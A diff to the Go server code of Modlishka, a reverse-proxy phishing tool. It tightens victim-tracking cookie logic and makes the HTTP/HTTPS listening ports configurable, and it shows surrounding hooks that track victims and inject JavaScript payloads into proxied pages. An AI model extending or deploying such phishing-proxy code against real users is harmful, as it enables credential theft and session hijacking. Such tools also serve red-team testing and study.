@@ -26,6 +26,7 @@ import (
 	"github.com/drk1wi/Modlishka/runtime"
 	"net"
 	"net/http"
+	"strconv"
 )
 
 var ServerRuntimeConfig *ServerConfig
@@ -73,8 +74,8 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 
 	// Do a redirect when tracking cookie was already set . We want to get rid of the TrackingParam from the URL!
 	queryString := r.URL.Query()
-	if _, ok := queryString[runtime.TrackingParam]; ok {
-		if _, err := r.Cookie(runtime.TrackingCookie); err == nil {
+	if uid1, ok := queryString[runtime.TrackingParam]; ok {
+		if uid2, err := r.Cookie(runtime.TrackingCookie); err == nil && uid1[0] == uid2.Value {
 			delete(queryString, runtime.TrackingParam)
 			r.URL.RawQuery = queryString.Encode()
 			log.Infof("User tracking: Redirecting client to %s", r.URL.String())
@@ -134,15 +135,13 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 		reverseProxy.RequestContext.InitUserID = val[0]
 		reverseProxy.RequestContext.UserID = val[0]
 		log.Infof("[P] Tracking victim via initial parameter %s", val[0])
+	} else if cookie, err := r.Cookie(runtime.TrackingCookie); err == nil {
+		reverseProxy.RequestContext.UserID = cookie.Value
 	}
 
 	//check if JS Payload should be injected
 	if payload := runtime.GetJSRulesPayload(r.Host + r.URL.String()); payload != "" {
 		reverseProxy.Payload = payload
-	}
-
-	if cookie, err := r.Cookie(runtime.TrackingCookie); err == nil {
-		reverseProxy.RequestContext.UserID = cookie.Value
 	}
 
 	reverseProxy.Proxy.ServeHTTP(w, r)
@@ -203,7 +202,9 @@ func RunServer() {
 	plugin.RegisterHandler(ServerRuntimeConfig.Handler)
 
 	var listener= string(*ServerRuntimeConfig.ListeningAddress)
-
+	var portHTTP = strconv.Itoa(*ServerRuntimeConfig.ListeningPortHTTP)
+	var portHTTPS = strconv.Itoa(*ServerRuntimeConfig.ListeningPortHTTPS)
+	
 	welcome := fmt.Sprintf(`
 %s
 
@@ -213,7 +214,7 @@ Author: Piotr Duszynski @drk1wi
 
 	if *ServerRuntimeConfig.ForceHTTP  {
 
-		var httplistener = listener + ":80"
+		var httplistener = listener + ":" + portHTTP
 		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via --> [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)
 		log.Infof("%s", welcome)
 
@@ -234,7 +235,7 @@ Author: Piotr Duszynski @drk1wi
 
 		embeddedTLSServer.Handler = ServerRuntimeConfig.Handler
 
-		var httpslistener= listener + ":443"
+		var httpslistener= listener + ":" + portHTTPS
 
 		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)
 
@@ -260,11 +261,11 @@ Author: Piotr Duszynski @drk1wi
 			var HTTPServerRuntimeConfig = &ServerConfig{
 				Options: ServerRuntimeConfig.Options,
 				Handler: ServerRuntimeConfig.Handler,
-				Port:    "80",
+				Port:    portHTTP,
 			}
 
-			var httpslistener= listener + ":443"
-			var httplistener= listener + ":80"
+			var httpslistener= listener + ":" + portHTTPS
+			var httplistener= listener + ":" + portHTTP
 
 			welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)
 			welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)
